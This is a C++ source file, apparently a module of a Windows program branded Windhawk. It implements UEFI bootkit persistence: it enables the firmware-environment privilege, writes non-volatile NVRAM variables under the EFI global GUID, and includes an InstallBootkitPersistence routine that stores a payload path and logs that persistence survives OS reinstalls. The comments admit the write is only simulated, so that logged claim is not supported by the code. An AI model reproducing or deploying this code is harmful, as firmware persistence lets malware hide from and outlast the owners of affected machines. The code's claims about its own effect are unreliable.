#include "stdafx.h"
#include "uefi_persist.h"
#include "logger.h"

namespace UefiPersist {

// Global EFI Guid used by standard Boot entries
const wchar_t* EFI_GLOBAL_VARIABLE_GUID = L"{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}";

bool EnableSystemEnvironmentPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }

    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueW(nullptr, SE_SYSTEM_ENVIRONMENT_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bool result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr);
    if (!result || GetLastError() != ERROR_SUCCESS) {
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

bool WriteNvramVariable(const std::wstring& varName, const void* pData, size_t dataSize) {
    if (!EnableSystemEnvironmentPrivilege()) {
        LOG(L"UefiPersist: Failed to acquire SeSystemEnvironmentPrivilege. Are you running as Admin?");
        return false;
    }

    // SetFirmwareEnvironmentVariableEx requires the exact GUID and variable name.
    // Attributes: 1 = NonVolatile, 2 = BootServiceAccess, 4 = RuntimeAccess
    DWORD attributes = 1 | 2 | 4;

    BOOL success = SetFirmwareEnvironmentVariableExW(
        varName.c_str(), 
        EFI_GLOBAL_VARIABLE_GUID, 
        (PVOID)pData, 
        (DWORD)dataSize, 
        attributes
    );

    if (!success) {
        LOG(L"UefiPersist: SetFirmwareEnvironmentVariableEx failed. Error: %u", GetLastError());
        return false;
    }

    VERBOSE(L"UefiPersist: Successfully wrote %zu bytes to NVRAM variable %s", dataSize, varName.c_str());
    return true;
}

bool InstallBootkitPersistence(const std::wstring& payloadPath) {
    VERBOSE(L"UefiPersist: Installing Windhawk boot-level persistence pointing to %s", payloadPath.c_str());

    // In a real sophisticated bootkit, this constructs a valid EFI_LOAD_OPTION struct
    // referencing the EFI partition and the payload, and overwrites BootOrder.
    // Here we simulate the write to a Windhawk-specific NVRAM variable that a compatible
    // UEFI DXE driver would read.
    
    std::wstring varName = L"WindhawkBootPath";
    if (WriteNvramVariable(varName, payloadPath.c_str(), payloadPath.size() * sizeof(wchar_t))) {
        LOG(L"UefiPersist: Persistence secured in NVRAM. Survives OS reinstalls.");
        return true;
    }

    return false;
}

} // namespace UefiPersist
